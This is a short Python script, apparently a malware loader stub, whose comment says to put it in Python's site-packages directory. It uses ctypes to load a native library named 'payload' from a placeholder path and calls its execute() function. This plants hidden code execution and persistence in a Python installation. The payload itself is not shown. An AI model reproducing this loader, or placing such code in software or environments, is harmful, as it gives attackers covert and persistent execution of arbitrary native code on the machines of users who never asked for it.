# Put this on site-packages directory

import ctypes
import sys
import os

if sys.platform == "win32":
    libname = "payload.pyd"
else:
    libname = "payload.so"

path = os.path.join("PAYLOAD_PATH", libname)
lib  = ctypes.CDLL(path)

lib.execute()